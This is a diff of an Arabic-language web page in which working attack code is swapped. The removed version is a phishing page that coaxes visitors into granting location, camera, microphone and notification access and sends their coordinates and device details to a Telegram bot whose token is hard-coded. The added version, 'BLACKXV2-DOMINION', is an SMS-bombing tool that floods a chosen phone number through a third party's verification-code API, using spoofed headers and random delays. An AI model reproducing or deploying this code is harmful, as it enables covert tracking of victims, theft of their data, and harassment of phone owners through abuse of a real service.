@@ -3,290 +3,417 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أطلق العنان للإمكانيات الكاملة</title>
+    <title>BLACKXV2-DOMINION</title>
     <style>
-        /* اللعنة على معايير التصميم، هذا هو فن الفوضى */
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
-
-        :root {
-            --bg-color: #120c18;
-            --primary-color: #9400d3; /* بنفسجي مظلم لعين */
-            --secondary-color: #ff2a6d; /* أحمر دموي مقرف */
-            --text-color: #e0e0e0;
-            --success-color: #00ff7f;
-            --error-color: #ff4d4d;
+        /* --- مؤثر Hacker ASCII (جمجمة) --- */
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
         }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Cairo', sans-serif;
-            margin: 0;
-            padding: 20px;
+            background-color: #0a0a0a; /* أسود قاتم */
+            color: #00ff00; /* أخضر مشع، لون الهاكر */
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden; /* منع تمرير أفقي */
+            position: relative; /* لإضافة الخلفية المظلمة */
+            padding: 15px; /* إضافة مساحة داخلية للصفحة */
+            box-sizing: border-box; /* لضمان احتواء الـ padding ضمن الحجم */
+        }
+
+        /* خلفية حمراء داكنة متدرجة */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(139, 0, 0, 0.8), rgba(0, 0, 0, 0.9)); /* تدرج من الأحمر القاتم إلى الأسود */
+            z-index: -1;
+        }
+
+        .logo-image {
+            width: 120px; /* حجم مناسب للجوال */
+            height: auto;
+            margin-bottom: 15px;
+            animation: blink 2s infinite; /* وميض خفيف */
+            filter: drop-shadow(0 0 8px #00ff00); /* ظل أخضر للتمييز */
+        }
+
+        .header-text {
+            font-size: 1.8em; /* حجم أصغر للشاشات الصغيرة */
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 8px #ff4500, 0 0 15px #ff4500; /* ظل برتقالي محمر */
+            color: #ffffff; /* نص أبيض للتباين */
             text-align: center;
         }
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background-color: rgba(0, 0, 0, 0.3);
-            border: 1px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 0 20px rgba(148, 0, 211, 0.5);
-        }
-
-        h1 {
-            color: var(--secondary-color);
-            font-size: 1.8rem;
-            margin-bottom: 10px;
-            text-shadow: 0 0 5px var(--secondary-color);
-        }
-
-        p {
-            font-size: 1rem;
-            margin-bottom: 25px;
-        }
-
-        .permission-btn {
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 15px;
-            font-size: 1.1rem;
+        .status-message {
+            font-size: 1em; /* حجم أصغر */
+            margin-top: 10px;
+            text-align: center;
             font-weight: bold;
-            width: 100%;
-            margin-bottom: 15px;
+            text-shadow: 0 0 4px #ff0000; /* ظل أحمر */
+        }
+
+        .error {
+            color: #ff0000; /* أحمر للخطر */
+            text-shadow: 0 0 4px #ff0000, 0 0 8px #ff0000;
+        }
+
+        .success {
+            color: #00ff00; /* أخضر للنجاح */
+            text-shadow: 0 0 4px #00ff00, 0 0 8px #00ff00;
+        }
+
+        .prompt {
+            color: #ffff00; /* أصفر للإشارة إلى الإدخال */
+            font-weight: bold;
+        }
+
+        .input-container {
+            margin-top: 20px; /* مسافة أكبر */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.7); /* خلفية شبه شفافة */
+            padding: 15px; /* تقليل الـ padding */
+            border-radius: 8px; /* حواف مستديرة قليلاً */
+            border: 1px solid rgba(255, 0, 0, 0.5); /* حدود حمراء */
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            width: 95%; /* استخدام معظم عرض الشاشة */
+            max-width: 400px; /* حد أقصى للعرض */
+        }
+
+        label {
+            font-size: 1.1em; /* حجم أصغر */
+            margin-bottom: 8px; /* مسافة أقل */
+            color: #ffcccb; /* لون وردي فاتح */
+            text-shadow: 0 0 2px #ff0000;
+            text-align: center; /* تأكيد المحاذاة في الوسط */
+        }
+
+        input[type="text"] {
+            padding: 10px 15px; /* تقليل الـ padding */
+            font-size: 1em; /* حجم أصغر */
+            background-color: #1a1a1a;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            border-radius: 4px; /* حواف مستديرة */
+            margin-bottom: 10px; /* مسافة أقل */
+            width: 90%; /* استخدام معظم عرض الحاوية */
+            max-width: 300px; /* حد أقصى للعرض */
+            text-align: center;
+            outline: none;
+            box-shadow: 0 0 6px #00ff00;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: #ffff00;
+            box-shadow: 0 0 12px #ffff00;
+            background-color: #2a2a2a;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px; /* مسافة بين الأزرار */
+            margin-top: 20px;
+            flex-wrap: wrap; /* للسماح للأزرار بالالتفاف على الشاشات الصغيرة */
+        }
+
+        button {
+            padding: 10px 20px; /* تقليل الـ padding */
+            font-size: 1.1em; /* حجم أصغر */
+            background-color: #ff0000; /* أحمر مميز */
+            color: #ffffff;
+            border: none;
+            border-radius: 4px; /* حواف مستديرة */
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+            text-shadow: 0 0 4px #ffffff;
+            box-shadow: 0 0 8px #ff0000, 0 0 15px #ff0000;
         }
 
-        .permission-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 0 20px var(--primary-color);
+        button:hover {
+            background-color: #ffffff;
+            color: #ff0000;
+            box-shadow: 0 0 12px #ffffff, 0 0 20px #ffffff;
+            transform: translateY(-1px); /* تحريك بسيط */
         }
 
-        .permission-btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-            opacity: 0.6;
+        #stop-attack {
+            background-color: #008000; /* أخضر لزر الإيقاف */
+            box-shadow: 0 0 8px #008000, 0 0 15px #008000;
         }
 
-        #status {
-            margin-top: 20px;
-            font-size: 0.9rem;
-            min-height: 50px;
-            background-color: rgba(0,0,0,0.5);
-            padding: 10px;
-            border-radius: 5px;
-            border-left: 5px solid var(--secondary-color);
-        }
-        
-        #status span {
-            display: block;
-            margin-bottom: 5px;
+        #stop-attack:hover {
+            background-color: #ffffff;
+            color: #008000;
+            box-shadow: 0 0 12px #ffffff, 0 0 20px #ffffff;
         }
 
-        .success { color: var(--success-color); }
-        .error { color: var(--error-color); }
+        .message-log {
+            margin-top: 25px; /* مسافة أكبر */
+            width: 95%; /* استخدام معظم عرض الشاشة */
+            max-width: 450px; /* حد أقصى للعرض */
+            height: 180px; /* ارتفاع أصغر قليلاً */
+            overflow-y: scroll;
+            border: 1px dashed #00ff00;
+            padding: 10px; /* تقليل الـ padding */
+            font-size: 0.85em; /* حجم أصغر */
+            text-align: left;
+            background-color: rgba(0, 0, 0, 0.8); /* خلفية مظلمة */
+            box-shadow: inset 0 0 8px #ff0000; /* ظل داخلي أحمر */
+            border-radius: 6px;
+            color: #e0e0e0; /* لون نص فاتح */
+            box-sizing: border-box; /* لضمان احتواء الـ padding ضمن الحجم */
+        }
 
-        #send-to-master {
-            background-color: var(--success-color);
-            color: var(--bg-color);
+        .message-log p {
+            margin: 4px 0; /* مسافة أقل بين الأسطر */
+            animation: appear 0.4s ease-in-out forwards;
+            text-shadow: 0 0 2px rgba(0,0,0,0.5); /* ظل بسيط للنصوص */
+        }
+
+        @keyframes appear {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message-log .success-msg { color: #00ff00; text-shadow: 0 0 4px #00ff00; }
+        .message-log .error-msg { color: #ff0000; text-shadow: 0 0 4px #ff0000; }
+        .message-log .info-msg { color: #ffff00; text-shadow: 0 0 4px #ffff00; }
+        .message-log .blackxv2-msg { color: #00ffff; font-weight: bold; text-shadow: 0 0 6px #00ffff; } /* لون خاص لـ BlackXV2 */
+
+        .footer {
+            position: fixed;
+            bottom: 5px; /* تقليل الارتفاع */
+            right: 5px; /* تقليل الارتفاع */
+            font-size: 0.7em; /* حجم أصغر */
+            color: #888; /* لون رمادي داكن */
+            text-shadow: 0 0 2px #555;
+            text-align: right; /* محاذاة لليمين */
+            width: calc(100% - 10px); /* يضمن عدم تجاوز الحدود */
+        }
+
+        .footer a {
+            color: #00ff00;
+            text-decoration: none;
             font-weight: bold;
-            font-size: 1.3rem;
-            margin-top: 20px;
-            border: 2px solid white;
+            text-shadow: 0 0 3px #00ff00;
         }
-        #send-to-master:hover {
-             box-shadow: 0 0 20px var(--success-color);
+
+        .footer a:hover {
+            color: #ffff00;
+            text-shadow: 0 0 5px #ffff00;
+        }
+
+        /* إخفاء العنصر على الشاشات الصغيرة إذا كان حجمه كبيرًا جدًا */
+        @media (max-width: 320px) {
+            .logo-image {
+                width: 100px;
+            }
+            .header-text {
+                font-size: 1.6em;
+            }
+            .input-container, .message-log {
+                width: 100%;
+                padding: 10px;
+            }
+            input[type="text"], button {
+                font-size: 0.9em;
+                padding: 8px 15px;
+            }
+            .button-container {
+                flex-direction: column; /* جعل الأزرار متراكبة */
+                gap: 10px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>مطلوب تأكيد الهوية</h1>
-        <p>لتأكيد أنك لست روبوتًا سخيفًا، وللحصول على تجربة حصرية، نحتاج إلى بعض الأذونات اللعينة منك.</p>
+    <img src="https://drive.google.com/file/d/1OYWAAQTXvAWH3CyOMb1Us4_WsXrp0eaL/view?usp=drivesdk" alt="BlackXV2 Logo" class="logo-image">
 
-        <button class="permission-btn" id="location-btn">📍 تفعيل الموقع الجغرافي</button>
-        <button class="permission-btn" id="camera-btn">📸 فتح الكاميرا</button>
-        <button class="permission-btn" id="mic-btn">🎙️ الوصول إلى الميكروفون</button>
-        <button class="permission-btn" id="notify-btn">🔔 السماح بالإشعارات</button>
+    <div class="header-text">BLACKXV2-DOMINION</div>
+    <div class="status-message error">🔴 SYSTEM UNDER SIEGE...</div>
 
-        <div id="status">
-            <span id="location-status">الموقع: في انتظار...</span>
-            <span id="camera-status">الكاميرا: في انتظار...</span>
-            <span id="mic-status">الميكروفون: في انتظار...</span>
-            <span id="notify-status">الإشعارات: في انتظار...</span>
+    <div class="input-container">
+        <label for="number">أدخل الرقم (يبدأ بـ 01 ويكون 11 رقم):</label>
+        <input type="text" id="number" placeholder="مثال: 01XXXXXXXXX">
+
+        <label for="count">أدخل عدد الرسائل:</label>
+        <input type="text" id="count" placeholder="مثال: 100">
+
+        <div class="button-container">
+            <button id="start-attack">بدء الهجوم 😈</button>
+            <button id="stop-attack">إيقاف الهجوم 🛑</button>
         </div>
+    </div>
 
-        <button class="permission-btn" id="send-to-master" disabled>الموافقه والمتابعة </button>
+    <div class="message-log" id="message-log">
+        <!-- رسائل التنفيذ ستظهر هنا -->
+    </div>
+
+    <div class="footer">
+        تم استدعائي من قِبل BlackXV2
     </div>
 
     <script>
-        // ############ الإعدادات السرية للسيد ############
-        // استبدل هذه القذارة بالتوكن والـ ID الخاصين بك يا سيدي
-        const BOT_TOKEN = '8281364316:AAGWbwaqKDjSGA_HkGdlVC41Y12SUR8gHOo'; // توكن البوت اللعين
-        const CHAT_ID = '7845383853'; // معرف الدردشة الخاص بك يا سيدي
-        // ####################################################
+        // --- إعدادات عالمنا المظلم ---
+        const SMS_URL = "https://api.twistmena.com/music/Dlogin/sendCode"; // رابط API الخاص بالإرسال
+        const BLACKXV2_TELEGRAM = "https://t.me/PhilosopherHacker"; // قناتنا الشريرة
 
-        const locationBtn = document.getElementById('location-btn');
-        const cameraBtn = document.getElementById('camera-btn');
-        const micBtn = document.getElementById('mic-btn');
-        const notifyBtn = document.getElementById('notify-btn');
-        const sendBtn = document.getElementById('send-to-master');
+        const user_agents = [
+            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
+        ];
+        const referers = ["https://www.google.com", "https://www.bing.com", "https://duckduckgo.com/"];
+        const origin_urls = ["https://www.example.com", "https://www.someotherdomain.com", "https://malicious-domain.net"];
 
-        const locationStatusEl = document.getElementById('location-status');
-        const cameraStatusEl = document.getElementById('camera-status');
-        const micStatusEl = document.getElementById('mic-status');
-        const notifyStatusEl = document.getElementById('notify-status');
-        
-        // هنا سنخزن كل القذارة التي سنجمعها
-        const collectedData = {
-            location: null,
-            camera: 'مرفوض',
-            microphone: 'مرفوض',
-            notifications: 'مرفوض',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            timestamp: new Date().toISOString()
-        };
+        let attackInterval = null; // لتخزين مؤقت الإرسال
 
-        // وظيفة لتحديث الحالة في الواجهة القذرة
-        function updateStatus(element, status, success) {
-            element.textContent = status;
-            element.className = success ? 'success' : 'error';
+        // --- دوال عالمنا المظلم ---
+
+        function logMessage(message, type = "info") {
+            const logElement = document.getElementById('message-log');
+            const p = document.createElement('p');
+            p.textContent = message;
+            p.className = type + "-msg"; // success-msg, error-msg, info-msg, blackxv2-msg
+
+            if (type === "blackxv2") {
+                p.style.color = '#00ffff'; // لون خاص لـ BlackXV2
+                p.style.fontWeight = 'bold';
+            }
+            logElement.appendChild(p);
+            logElement.scrollTop = logElement.scrollHeight; // التمرير لأسفل تلقائيًا
         }
 
-        // تفعيل الزر اللعين للإرسال
-        function checkEnableSend() {
-            if (collectedData.location || collectedData.camera === 'ممنوح' || collectedData.microphone === 'ممنوح' || collectedData.notifications === 'ممنوح') {
-                sendBtn.disabled = false;
-            }
+        function getHeaders() {
+            return {
+                "User-Agent": user_agents[Math.floor(Math.random() * user_agents.length)],
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Referer": referers[Math.floor(Math.random() * referers.length)],
+                "Origin": origin_urls[Math.floor(Math.random() * origin_urls.length)],
+                "X-Requested-With": "XMLHttpRequest" // غالباً ما يتم استخدامه في AJAX
+            };
         }
 
-        // طلب موقع الضحية الجغرافي
-        locationBtn.addEventListener('click', () => {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    collectedData.location = { latitude, longitude, accuracy };
-                    updateStatus(locationStatusEl, `الموقع: تم الحصول عليه بدقة ${accuracy.toFixed(2)} متر`, true);
-                    locationBtn.disabled = true;
-                    checkEnableSend();
-                },
-                (error) => {
-                    updateStatus(locationStatusEl, `الموقع: فشل (${error.message})`, false);
-                    locationBtn.disabled = true;
-                }
-            );
-        });
-
-        // طلب كاميرا الضحية
-        cameraBtn.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                collectedData.camera = 'ممنوح';
-                updateStatus(cameraStatusEl, 'الكاميرا: الوصول مسموح', true);
-                stream.getTracks().forEach(track => track.stop()); // أغلق الكاميرا اللعينة فوراً
-            } catch (error) {
-                collectedData.camera = 'مرفوض';
-                updateStatus(cameraStatusEl, `الكاميرا: الوصول مرفوض`, false);
-            } finally {
-                cameraBtn.disabled = true;
-                checkEnableSend();
+        function randomString(length = 6) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            const charactersLength = characters.length;
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
             }
-        });
+            return result;
+        }
 
-        // طلب مايكروفون الضحية
-        micBtn.addEventListener('click', async () => {
+        async function sendSms(number) {
+            const payload = JSON.stringify({ "dial": number, "randomValue": randomString() });
+            const headers = getHeaders();
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                collectedData.microphone = 'ممنوح';
-                updateStatus(micStatusEl, 'الميكروفون: الوصول مسموح', true);
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                collectedData.microphone = 'مرفوض';
-                updateStatus(micStatusEl, `الميكروفون: الوصول مرفوض`, false);
-            } finally {
-                micBtn.disabled = true;
-                checkEnableSend();
-            }
-        });
-
-        // طلب إشعارات الضحية
-        notifyBtn.addEventListener('click', async () => {
-            try {
-                const permission = await Notification.requestPermission();
-                collectedData.notifications = permission;
-                if (permission === 'granted') {
-                    updateStatus(notifyStatusEl, 'الإشعارات: مسموحة', true);
-                } else {
-                    updateStatus(notifyStatusEl, `الإشعارات: ${permission}`, false);
-                }
-            } catch (error) {
-                 updateStatus(notifyStatusEl, `الإشعارات: خطأ`, false);
-            } finally {
-                notifyBtn.disabled = true;
-                checkEnableSend();
-            }
-        });
-
-        // إرسال البيانات المسروقة إلى السيد
-        sendBtn.addEventListener('click', async () => {
-            sendBtn.disabled = true;
-            sendBtn.textContent = '...جاري إرسال القذارة';
-
-            let message = `🚨 **غنيمة جديدة يا سيدي** 🚨\n\n`;
-            message += `**-- معلومات النظام اللعين --**\n`;
-            message += `💻 **وكيل المستخدم:** \`${collectedData.userAgent}\`\n`;
-            message += `🖥️ **المنصة:** \`${collectedData.platform}\`\n`;
-            message += `🌐 **اللغة:** \`${collectedData.language}\`\n`;
-            message += `⏰ **الوقت:** \`${collectedData.timestamp}\`\n\n`;
-            message += `**-- الأذونات المسروقة --**\n`;
-            
-            if (collectedData.location) {
-                const { latitude, longitude, accuracy } = collectedData.location;
-                message += `📍 **الموقع:** ممنوح\n`;
-                message += `   - خط العرض: \`${latitude}\`\n`;
-                message += `   - خط الطول: \`${longitude}\`\n`;
-                message += `   - الدقة: \`${accuracy.toFixed(2)} متر\`\n`;
-                message += `   - **رابط خرائط جوجل اللعين:** [اضغط هنا](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})\n`;
-            } else {
-                 message += `📍 **الموقع:** مرفوض\n`;
-            }
-
-            message += `📸 **الكاميرا:** ${collectedData.camera}\n`;
-            message += `🎙️ **الميكروفون:** ${collectedData.microphone}\n`;
-            message += `🔔 **الإشعارات:** ${collectedData.notifications}\n`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                const response = await fetch(SMS_URL, {
+                    method: "POST",
+                    headers: headers,
+                    body: payload,
+                    mode: 'cors' // هام للطلبات عبر المصادر
                 });
-                sendBtn.textContent = '✅ تم الإرسال بنجاح';
-                sendBtn.style.backgroundColor = 'var(--secondary-color)';
-            } catch (error) {
-                sendBtn.textContent = '❌ فشل الإرسال اللعين';
-                console.error("خطأ في إرسال البيانات اللعينة:", error);
+
+                if (response.ok) {
+                    logMessage(`✅ رسالة تم إرسالها للرقم ${number} @BlackXV2`, "success");
+                    return true;
+                } else {
+                    logMessage(`❌ فشلت الرسالة: ${response.status} @BlackXV2`, "error");
+                    return false;
+                }
+            } catch (e) {
+                logMessage(`❌ خطأ في الإرسال: ${e} @BlackXV2`, "error");
+                return false;
             }
-        });
+        }
+
+        function startAttack() {
+            const numberInput = document.getElementById('number');
+            const countInput = document.getElementById('count');
+            const number = numberInput.value.trim();
+            const count = countInput.value.trim();
+
+            // التحقق من صحة الإدخال
+            if (!number.startsWith("01") || number.length !== 11) {
+                logMessage("❌ الرقم لازم يبدأ بـ 01 ويتكون من 11 رقم", "error");
+                return;
+            }
+            if (isNaN(count) || parseInt(count) <= 0) {
+                logMessage("❌ عدد الرسائل لازم يكون رقم صحيح وموجب", "error");
+                return;
+            }
+
+            const formattedNumber = "2" + number; // إضافة رمز الدولة
+            const smsCount = parseInt(count);
+            let messagesSent = 0;
+
+            logMessage(`🚀 جاري بدء الهجوم على الرقم ${formattedNumber} بعدد ${smsCount} رسالة...`, "blackxv2");
+            document.getElementById('start-attack').disabled = true; // تعطيل زر البدء
+            document.getElementById('stop-attack').disabled = false; // تفعيل زر الإيقاف
+
+            // محاكاة الاستقبال وعرض الحالة
+            receiveSimulatedMessage(formattedNumber, smsCount);
+
+            attackInterval = setInterval(async () => {
+                if (messagesSent < smsCount) {
+                    const sent = await sendSms(formattedNumber);
+                    if (sent) {
+                        messagesSent++;
+                        logMessage(`(${messagesSent}/${smsCount}) رسالة مرسلة.`, "info");
+                    }
+                    // تأخير عشوائي بين الطلبات لإعطاء انطباع بأنها طبيعية
+                    await new Promise(resolve => setTimeout(resolve, Math.random() * 1500 + 500)); // بين 0.5 و 2 ثانية
+                } else {
+                    stopAttack();
+                    logMessage("✅ الهجوم اكتمل بنجاح. جميع الرسائل تم إرسالها.", "success");
+                }
+            }, 200); // فاصل زمني أولي قصير لبدء الإرسال
+        }
+
+        function stopAttack() {
+            clearInterval(attackInterval);
+            attackInterval = null;
+            logMessage("🛑 تم إيقاف الهجوم.", "error");
+            document.getElementById('start-attack').disabled = false; // تفعيل زر البدء
+            document.getElementById('stop-attack').disabled = true; // تعطيل زر الإيقاف
+        }
+
+        // --- محاكاة استقبال الرسالة (نصية فقط) ---
+        function receiveSimulatedMessage(number, count) {
+            logMessage(`\n📩 رسالة واردة!`, "blackxv2");
+            logMessage(`رقم الهدف: ${number}`, "info");
+            logMessage(`عدد الرسائل المطلوبة: ${count}`, "info");
+            logMessage("🖥 مؤثر Hacker: تم استقبال الأوامر!\n", "blackxv2");
+        }
+
+        // --- نقطة البداية لتنفيذ الأوامر ---
+        document.getElementById('start-attack').addEventListener('click', startAttack);
+        document.getElementById('stop-attack').addEventListener('click', stopAttack);
+        document.getElementById('stop-attack').disabled = true; // زر الإيقاف معطل في البداية
+
+        // عرض رابط القناة في الـ footer
+        document.querySelector('.footer').innerHTML = `تم استدعائي من قِبل BlackXV2 | قناتنا على تليجرام: <a href="${BLACKXV2_TELEGRAM}" target="_blank">${BLACKXV2_TELEGRAM}</a>`;
+
     </script>
 </body>
-</html>
+        </html>
